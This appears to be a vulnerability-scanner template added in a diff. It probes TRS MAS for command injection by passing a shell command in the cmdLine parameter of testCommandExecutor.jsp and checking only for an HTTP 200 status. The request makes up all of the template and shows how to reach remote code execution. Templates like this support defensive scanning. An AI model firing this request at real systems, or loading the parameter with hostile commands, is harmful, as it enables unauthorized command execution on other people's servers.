@@ -1,0 +1,19 @@
+id: yaml-poc-trs-trs_mas-command_injection-CT-442528
+info:
+  name: Yaml Poc Trs Trs_Mas Command_Injection Ct 442528
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-trs-trs_mas-command_injection-CT-442528'
+  tags: rce
+  reference:
+  - https://www.little2pig.work/archives/trs-mas
+  - https://x.threatbook.com/v5/vul/fb0f9a70f51b075c60d65a5eb51d5a7b6316224d977967fbf8d281df090c64fe308e638233d8b18c42dd015484b4e380
+http:
+- method: GET
+  path:
+  - /mas/sysinfo/testCommandExecutor.jsp?cmdLine=type%20{{r1}}%20+%20{{r2}}&workDir=&pathEnv=&libPathEnv=
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
